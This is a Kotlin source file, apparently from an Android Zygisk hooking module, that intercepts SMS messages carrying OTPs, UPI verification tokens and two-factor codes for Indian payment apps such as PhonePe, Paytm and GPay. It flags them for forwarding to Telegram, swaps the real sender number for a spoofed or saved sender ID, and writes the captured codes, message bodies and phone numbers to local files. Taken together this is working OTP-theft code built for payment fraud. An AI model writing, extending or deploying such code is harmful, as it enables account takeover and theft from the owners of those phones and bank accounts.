package com.hivirtus.zygiskmode

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import org.json.JSONObject
import java.util.regex.Pattern

object SmsMatcher {

    private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
    private val PLACEHOLDER_SENDER = "AD-TEST-S"

    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
        UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }

    fun userSenderId(config: ModuleConfig): String? {
        val id = config.injectSenderId.trim()
        if (id.isBlank()) return null
        if (id.equals(PLACEHOLDER_SENDER, ignoreCase = true)) return null
        return id
    }

    fun matchedHookedApp(config: ModuleConfig, peer: String, body: String): UpiAppRegistry.UpiApp? {
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return null
        return UpiAppRegistry.matchAmong(hooked, peer, body)
    }

    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
        if (!config.hookIncomingSms && !config.hookUpiVerification) return false
        return shouldInterceptIncoming(config, sender, body)
    }

    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        return shouldInterceptOutgoing(config, recipient, body)
    }

    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String, direction: String): Boolean {
        if (!config.autoForwardToken) return false
        return when (direction) {
            "outgoing" -> shouldInterceptOutgoing(config, peer, body)
            else -> shouldInterceptIncoming(config, peer, body)
        }
    }

    fun shouldInterceptIncoming(config: ModuleConfig, peer: String, body: String): Boolean {
        if (body.isBlank() || peer.isBlank()) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return false

        // Dusre phone (+91) se OTP — Sender ID saved + hooked apps
        if (userSenderId(config) != null && (extractOtpDigits(body) != null || isUpiVerificationContent(body))) {
            return true
        }

        if (!isUpiVerificationContent(body) && extractOtpDigits(body) == null) return false

        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
        if (UpiAppRegistry.matchAmongBySender(hooked, peer) != null) return true
        if (UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
        if (isEncryptedToken(body) && hooked.isNotEmpty()) return true
        if (is2faContent(body)) return true

        return false
    }

    fun shouldInterceptOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        if (body.isBlank() || recipient.isBlank()) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return false

        if (isUpiVerificationContent(body) || isEncryptedToken(body)) return true
        if (is2faContent(body)) return true
        if (isShortCodeRecipient(recipient)) return true
        if (UpiAppRegistry.matchAmong(hooked, recipient, body) != null) return true
        if (extractOtpDigits(body) != null && userSenderId(config) != null) return true

        return body.length >= 4
    }

    /**
     * +91 / phone number kabhi mat dikhao — hamesha saved Sender ID.
     * Dusre phone se aaya ho to bhi Sender ID dikhega.
     */
    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
        userSenderId(config)?.let { return it }
        if (isIndianMobileNumber(actualPeer) || isNumericSender(actualPeer)) {
            return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
        }
        if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
        return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
    }

    fun isIndianMobileNumber(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        if (digits.length == 10) return true
        if (digits.length == 12 && digits.startsWith("91")) return true
        if (digits.length == 11 && digits.startsWith("0")) return true
        return false
    }

    fun isCarrierSenderId(sender: String): Boolean {
        val s = sender.trim()
        if (s.isBlank() || isIndianMobileNumber(s) || isNumericSender(s)) return false
        return s.any { it.isLetter() }
    }

    fun isNumericSender(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        return digits.length >= 8 && !sender.any { it.isLetter() }
    }

    fun isShortCodeRecipient(recipient: String): Boolean {
        val digits = recipient.replace("\\D".toRegex(), "")
        return digits.length in 4..10
    }

    fun extractOtpDigits(body: String): String? {
        val matcher = OTP_PATTERN.matcher(body)
        if (matcher.find()) {
            val digits = matcher.group(1) ?: return null
            if (digits.length in 4..8) return digits
        }
        val trimmed = body.trim()
        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return trimmed
        return null
    }

    fun extractToken(body: String, autoExtract: Boolean): String {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return ""
        if (isEncryptedToken(trimmed)) return trimmed
        if (isUpiVerificationContent(trimmed)) return trimmed
        if (!autoExtract) return trimmed
        return extractOtpDigits(trimmed) ?: trimmed
    }

    fun isEncryptedToken(text: String): Boolean {
        if (text.length < 24) return false
        val compact = text.replace("\\s".toRegex(), "")
        if (compact.length < 20) return false
        val tokenChars = compact.count { it.isLetterOrDigit() || it in "+/=)(?&._-" }
        return tokenChars >= compact.length * 0.85
    }

    private fun is2faContent(body: String): Boolean {
        val upper = body.uppercase()
        val keywords = listOf(
            "2FA", "TWO FACTOR", "TWOFACTOR", "TWO-FACTOR", "SECOND OTP", "2ND OTP",
            "LOGIN OTP", "AUTHENTICATION", "AUTH CODE", "SECURE CODE", "STEP 2"
        )
        return keywords.any { upper.contains(it) }
    }

    private fun isUpiVerificationContent(body: String): Boolean {
        if (isEncryptedToken(body)) return true
        if (is2faContent(body)) return true
        if (extractOtpDigits(body) != null) return true
        val trimmed = body.trim()
        if (trimmed.length <= 3) return false
        val upper = trimmed.uppercase()
        val keywords = listOf(
            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
            "PHONEPE", "PAYTM", "PYTM", "GPAY", "BHIM", "CODE", "PIN", "BANK", "PAY"
        )
        return keywords.any { upper.contains(it) }
    }
}

object OtpCaptureWriter {

    fun write(context: Context, otp: LastOtp) {
        val json = JSONObject().apply {
            put("otp", otp.otp)
            put("sender", otp.sender)
            put("body", otp.body)
            put("direction", otp.direction)
            put("phone", otp.phone)
            put("raw_peer", otp.rawPeer)
            put("message_label", otp.messageLabel)
            put("captured_at", System.currentTimeMillis())
        }
        val payload = json.toString()
        val appDir = context.getExternalFilesDir(null) ?: context.filesDir

        try {
            appDir.mkdirs()
            java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
        } catch (_: Exception) {}

        try {
            java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
        } catch (_: Exception) {}
    }
}
